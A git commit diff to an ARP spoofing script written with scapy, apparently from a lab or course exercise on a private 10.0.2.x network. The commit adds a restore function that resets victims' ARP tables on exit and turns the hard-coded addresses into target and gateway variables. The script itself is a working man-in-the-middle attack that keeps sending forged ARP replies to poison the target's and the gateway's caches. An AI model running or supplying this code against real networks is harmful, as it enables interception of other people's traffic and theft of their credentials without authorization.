6d2332c92629ee47cc659796f744c39b84119677
mthwbrwn <mthwbrwn@gmail.com>
2019-06-22 13:44:43 -0700

    added restor feature to change spoof back upon keyboard interupt

--- arp_spoof.py
+++ arp_spoof.py
@@ -15,18 +15,30 @@ def get_mac(ip):
 def send_spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-
     scapy.send(packet, verbose=False)
+
+
+def restore(dst_ip, src_ip):
+    dst_mac = get_mac(dst_ip)
+    src_mac = get_mac(src_ip)
+    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
+
+    scapy.send(packet, count=4, verbose=False)
+
+target_ip = '10.0.2.7'
+gateway_ip = '10.0.2.1'
 
 packets_sent = 0
 try:
     while True:
-        send_spoof('10.0.2.6', '10.0.2.1')
-        send_spoof('10.0.2.1', '10.0.2.6')
+        send_spoof(target_ip, gateway_ip)
+        send_spoof(gateway_ip, target_ip)
         packets_sent += 2
         print('\rpackets sent = ' + str(packets_sent)),
         sys.stdout.flush()
-
         time.sleep(2)
+
 except KeyboardInterrupt:
-    print ('\r Ctrl + C quit.  ending spoof...       ')
+    print ('\r ending spoof... resetting ARP tables       ')
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
